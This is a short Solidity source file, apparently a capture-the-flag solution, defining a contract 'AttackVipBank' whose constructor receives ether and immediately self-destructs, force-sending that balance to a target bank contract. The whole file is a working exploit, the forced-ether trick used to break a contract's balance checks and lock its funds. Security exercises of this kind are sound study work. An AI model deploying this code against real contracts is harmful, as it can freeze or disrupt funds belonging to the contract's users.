// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.7;

contract AttackVipBank {
    constructor (address VIP_Bank) payable {
        selfdestruct(payable(VIP_Bank));
    }
}